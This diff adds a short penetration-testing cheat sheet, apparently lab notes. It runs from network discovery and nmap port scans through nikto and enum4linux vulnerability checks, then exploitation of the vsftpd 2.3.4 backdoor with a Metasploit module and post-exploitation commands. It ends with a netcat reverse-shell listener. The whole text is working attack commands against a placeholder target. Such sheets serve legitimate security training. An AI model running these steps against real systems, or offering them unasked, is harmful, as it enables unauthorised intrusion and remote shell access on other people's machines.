@@ -1,0 +1,32 @@
+a) Network Discovery
+ip a
+netdiscover
+nmap -sn 192.168.1.0/24
+
+b) Port Scanning
+nmap -sS <target-ip>
+nmap -sV <target-ip>
+nmap -O <target-ip>
+nmap -A <target-ip>
+nmap -p- <target-ip>
+
+c) Vulnerability Detection
+nmap --script vuln <target-ip>
+nikto -h http://<target-ip>
+enum4linux <target-ip>
+
+d)Exploitation
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <target-ip>
+run
+
+e)Post Exploitation
+whoami
+uname -a
+ls
+pwd
+
+f)Reverse Shell Listener
+nc -lvnp 4444
